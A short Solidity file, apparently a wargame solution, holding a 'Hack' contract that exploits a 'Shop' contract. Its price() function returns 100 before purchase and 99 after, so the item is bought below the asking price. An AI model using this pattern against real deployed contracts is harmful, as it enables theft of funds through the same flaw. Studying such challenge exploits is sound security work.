// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract Hack {
    Shop private immutable target;

    constructor(Shop _target) {
        target = _target;
    }

    function attack() external {
        target.buy();
        require(target.price() == 99, "attach failed");
    }

    function price() external view returns (uint) {
        if (target.isSold()) {
            return 99;
        }
        return 100;
    }
}
